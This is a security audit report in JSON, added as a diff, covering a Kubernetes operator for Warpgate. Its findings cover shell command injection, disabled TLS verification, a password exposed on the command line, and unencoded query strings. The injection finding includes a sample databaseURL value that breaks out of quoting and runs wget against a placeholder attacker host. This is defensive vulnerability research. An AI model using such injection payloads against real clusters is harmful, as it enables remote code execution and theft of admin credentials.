@@ -1,0 +1,74 @@
+{
+  "summary": "Reviewed the warpgate-operator Go sources under api/v1alpha1 (CRD types, webhooks/validation), internal/controller (all reconcilers, helpers, HTTPRoute watcher) and internal/warpgate (REST client, credentials, targets, users) plus cmd/main.go. The operator is a Kubernetes controller that provisions Warpgate instances and syncs targets/users/credentials via an admin API. The most serious issue is shell command injection into the init-container script built from an unvalidated WarpgateInstance spec field, which lets anyone able to create/update a WarpgateInstance run arbitrary commands in the instance pod. Secondary issues involve TLS verification being unconditionally disabled on the auto-created admin connection, the admin password being placed on a process command line, and unencoded user-controlled values in Warpgate API query strings. No SQL injection or classic web-app sinks exist (there is no database or HTML rendering in this operator).",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "internal/controller/helpers.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/ssh_keys.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateconnection_webhook.go"
+  ],
+  "findings": [
+    {
+      "title": "Command injection via spec.databaseURL in WarpgateInstance init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a /bin/sh init script by string concatenation and injects inst.Spec.DatabaseURL directly into a shell command. The value is only wrapped in double quotes, so a DatabaseURL containing a double quote plus shell metacharacters breaks out and runs arbitrary commands. The field is not validated for content: validateWarpgateInstance (api/v1alpha1/warpgateinstance_webhook.go:256-258) only emits a warning when databaseURL is set. Any principal with RBAC to create or update a WarpgateInstance (a namespaced custom-resource permission that is not supposed to grant pod exec) can therefore execute arbitrary commands inside the Warpgate init/main container, which has the admin-password Secret mounted as ADMIN_PASSWORD and the data PVC attached \u2014 enabling credential theft and full compromise of the instance. Example payload for spec.databaseURL: `sqlite:/data/db\" ; wget http://attacker/x -O /data/p; \"`.",
+      "evidence": "Line 557: setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)  -> setupCmd is embedded into scriptParts (line 570) -> initScript = strings.Join(scriptParts, \"\\n\") (611) -> Command: []string{\"/bin/sh\", \"-c\", initScript} (776). No sanitization of DatabaseURL; webhook only warns (warpgateinstance_webhook.go:256).",
+      "recommendation": "Do not build the shell command by interpolation. Pass the database URL to the setup binary via an environment variable (like ADMIN_PASSWORD) and reference it with proper quoting, or strictly validate spec.databaseURL against an allowlisted URL scheme/character set in the validating webhook and reject shell metacharacters. The same applies to any other spec field concatenated into the init script."
+    },
+    {
+      "title": "TLS certificate verification unconditionally disabled on auto-created admin WarpgateConnection",
+      "category": "security",
+      "cwe": "CWE-295",
+      "severity": "medium",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 1109,
+      "line_end": 1114,
+      "description": "When the instance controller auto-creates a WarpgateConnection it hardcodes InsecureSkipVerify: true. That connection carries the Warpgate admin username/password (built from the admin-password Secret at lines 1085-1088) and is used by getWarpgateClient/buildClient, which honor conn.Spec.InsecureSkipVerify to set tls.Config.InsecureSkipVerify (internal/warpgate/client.go:55-58). With verification disabled the operator will present admin credentials to any endpoint that answers on the service name, so an in-cluster attacker able to intercept/redirect the ClusterIP traffic (e.g. via a malicious pod performing ARP/DNS spoofing or a hostile service takeover) can capture the Warpgate admin password. Because the value is hardcoded, users cannot opt into verification even after supplying a cert-manager/trusted certificate.",
+      "evidence": "conn.Spec = warpgatev1alpha1.WarpgateConnectionSpec{ Host: host, AuthSecretRef: ..., InsecureSkipVerify: true } (line 1112). Consumed in client.go NewClient: transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} (55-58); admin password sourced at warpgateinstance_controller.go:1080-1088.",
+      "recommendation": "Verify the certificate against the CA the operator provisions. When cert-manager is enabled (or a TLS secret is supplied), trust that CA and set InsecureSkipVerify: false; only fall back to skip-verify for the transient self-signed bootstrap window, and make it configurable rather than a hardcoded true."
+    },
+    {
+      "title": "Admin password exposed on the init container process command line",
+      "category": "security",
+      "cwe": "CWE-214",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 549,
+      "line_end": 552,
+      "description": "The init script runs `warpgate ... --admin-password \"${ADMIN_PASSWORD}\"`. The shell expands ${ADMIN_PASSWORD} before exec, so the plaintext admin password appears in the warpgate process argv and is readable via /proc/<pid>/cmdline to anyone who can inspect processes in that pod (or on the node), and often surfaces in process listings and crash dumps. The password is otherwise correctly sourced from a Secret via env var, so the exposure is only the argv leak.",
+      "evidence": "setupCmd base string includes --admin-password \"${ADMIN_PASSWORD}\" (line 550); ADMIN_PASSWORD is injected via SecretKeyRef (lines 779-789) but expanded into argv at runtime.",
+      "recommendation": "If the warpgate CLI supports reading the admin password from an environment variable or a file, use that form so the secret never appears in argv; otherwise document the residual exposure and ensure the pod runs with a restricted securityContext and no shared process namespace."
+    },
+    {
+      "title": "Unescaped user-controlled search value in Warpgate API query string (ListUsers/ListTargets)",
+      "category": "security",
+      "cwe": "CWE-88",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/warpgate/user.go",
+      "line_start": 79,
+      "line_end": 89,
+      "description": "ListUsers appends the caller-supplied search term directly to the request path (`/users?search=` + search) with no URL encoding. The value originates from CR spec fields such as WarpgatePasswordCredential.Spec.Username, which are user-controlled. Characters like `&`, `#`, spaces or `%` alter the request (additional query parameters, fragment truncation, or malformed URL errors) sent to the Warpgate admin API. Impact is limited because the operator only queries its own trusted Warpgate instance and re-matches results exactly, but it is a genuine unencoded-input-to-URL flaw and a correctness/robustness risk. The same pattern exists in internal/warpgate/target.go:206-216 (ListTargets).",
+      "evidence": "user.go:81-83  path := \"/users\"; if search != \"\" { path += \"?search=\" + search }  -> c.Get(path,...). Duplicate at target.go:208-210. search reaches here from CR spec (e.g. warpgatepasswordcredential_controller.go:104 GetUserByUsername(cred.Spec.Username)).",
+      "recommendation": "Build the query with net/url, e.g. url.Values{\"search\": {search}}.Encode(), so the value is percent-encoded. Apply the same fix to ListTargets."
+    }
+  ]
+}
